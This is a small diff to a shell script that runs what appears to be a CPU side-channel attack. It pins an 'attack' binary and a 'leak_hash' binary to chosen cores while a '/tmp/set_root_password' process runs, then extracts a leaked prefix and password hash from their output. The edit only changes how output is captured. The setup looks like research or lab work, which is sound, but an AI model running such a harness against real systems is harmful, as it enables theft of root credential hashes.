@@ -8,8 +8,7 @@ make all
 echo
 echo "Running prefix attack..."
 
-taskset -c 1,5 ./attack > prefix_output.txt & (sleep 1 && taskset -c 3 /tmp/set_root_password)
-cat prefix_output.txt
+taskset -c 1,5 ./attack | tee prefix_output.txt & (sleep 1 && taskset -c 3 /tmp/set_root_password)
 
 # Extract operands
 PREFIX=$(grep "Prefix: " prefix_output.txt | cut -d' ' -f2)
@@ -17,8 +16,7 @@ PREFIX=$(grep "Prefix: " prefix_output.txt | cut -d' ' -f2)
 echo
 echo "Running leak hash..."
 
-taskset -c 0,4 ./leak_hash > leak_output.txt
-cat leak_output.txt
+taskset -c 0,4 ./leak_hash | tee leak_output.txt
 
 HASH=$(grep "Hash: " leak_output.txt | cut -d':' -f3)
 
